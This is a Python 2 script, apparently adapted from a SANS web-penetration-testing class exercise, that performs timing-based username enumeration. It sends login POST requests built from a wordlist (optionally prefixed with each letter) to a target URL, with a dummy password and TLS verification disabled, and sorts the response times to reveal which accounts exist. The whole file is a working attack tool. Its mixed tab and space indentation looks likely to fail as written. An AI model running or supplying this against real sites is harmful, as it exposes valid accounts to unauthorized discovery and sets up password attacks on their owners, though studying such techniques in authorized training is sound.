# Modified by hodorsec for URL as a parameter and timing option, ssl/tls disable checks, random user-agent, sorting results
# Original by Adrien de Beaupre for the SANS Sec542 class, with comments

# Import some libraries to use
import sys			                            # For sys.exit(1)
import os			                            # For os.path.isfile()
import requests                                             # Use requests instead of urllib
import string			                            # To strip whitespace and for alphabet
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Disable SSL/TLS cert warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy 
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Do the magic
def main(argv):
        # Check arguments
	if len(sys.argv) == 4: 
		filetoread = sys.argv[1]
                url = sys.argv[2]
                prefix_lastname = sys.argv[3]
	else:
		print "Usage: " + sys.argv[0] + " inputfile URL prefixchar(optional, 0 to disable or 1 to enable)\n"
                print "Example: " + sys.argv[0] + " /opt/wordlist/fuzz.txt http://www.website.com/login.php 0"
                print "Example: " + sys.argv[0] + " /opt/wordlist/fuzz.txt http://www.website.com/login.php 1\n"
		sys.exit(1)
	
        # Randomize useragent
        useragent = Randomize().random_agent('desktop','windows')

        # HTTP Headers. Might need modification for each webapplication
        headers = {
            'User-Agent': useragent,
        }
        
        # Initialize list for result
        result = []

        # Check to see if it is a file to read as an argument
	if os.path.isfile(filetoread):
		# File exists and keep going
		pass
	else:
		# Print error and bail, file not there
		print "The following file does not exist:", filetoread
		sys.exit(1)

	# Open up the file handle
	infile = open(filetoread, 'r')

	# Iterate through the file
	for line in infile:
		    # Iterate through the alphabet, if desired
                    if prefix_lastname == "1":
		        for prefix in string.ascii_lowercase:
                            username = prefix + line.strip()
		            # Create the arguments for login. Might need modification for each webapplication
                            login_args = { 'user': username, 'pass':'bar' } 
		            # Get the URL
		            try:
		                # Use requests to encode the parameters. Don't check SSL/TLS cert
                                resp = requests.post(url, data = login_args, verify=False, headers=headers)
                                rtt = resp.elapsed.total_seconds()
		                # Look for timing responses
                                result.append(str(rtt) + " Username: " + username)
		            except requests.exceptions.Timeout:
                                print "Timeout error"
                                sys.exit(1)
                            except requests.exceptions.TooManyRedirects:
                                print "Too many redirects"
                                sys.exit(1)
                            except requests.exceptions.RequestException as e:
                                print e
                                sys.exit(1)
                            except requests.exceptions.HTTPError as e:
    		                print "Failed with error code - %s." % e.code
                    else:
                        username = line.strip()
		        # Create the arguments for login. Might need modification for each webapplication
                        login_args = { 'user': username, 'pass':'bar' } 
		        # Get the URL
		        try:
		            # Use requests to encode the parameters. Don't check SSL/TLS cert
                            resp = requests.post(url, data = login_args, verify=False)
                            rtt = resp.elapsed.total_seconds()
		            # Look for timing responses
                            result.append(str(rtt) + " Username: " + username)
		        except requests.exceptions.Timeout:
                            print "Timeout error"
                            sys.exit(1)
                        except requests.exceptions.TooManyRedirects:
                            print "Too many redirects"
                            sys.exit(1)
                        except requests.exceptions.RequestException as e:
                            print e
                            sys.exit(1)
                        except requests.exceptions.HTTPError as e:
    		            print "Failed with error code - %s." % e.code
        
        # Sort list and print results
        sorted_result = sorted(result)
        print('\n'.join(sorted_result))

# If we were called as a program, go execute the main function. 
if __name__ == "__main__":
	main(sys.argv[1:])


